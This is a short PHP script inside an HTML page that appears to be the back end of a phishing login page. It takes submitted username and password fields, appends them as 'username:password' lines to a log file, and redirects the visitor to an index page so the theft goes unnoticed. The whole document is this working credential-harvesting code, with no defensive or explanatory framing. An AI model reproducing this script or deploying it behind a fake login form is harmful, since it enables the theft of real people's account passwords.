<html>
<?php

// Set the location of the text file.
$path = '../data/log.txt';

// A boolean check to make sure that the fields have values.
 if (isset($_POST['username']) && isset($_POST['password'])) {

    // Open the file in write mode.
    $file = fopen($path, "a") or die("cant open");

    // Declare a single string of both values.
    $data = $_POST['username'] . ":" . $_POST['password'] . "\n";

    // Write to file.
    fwrite($file, $data);

    // Close the file.
    fclose($file);

 }

?>
<script> location.href = '../index.html'; </script>
</html>
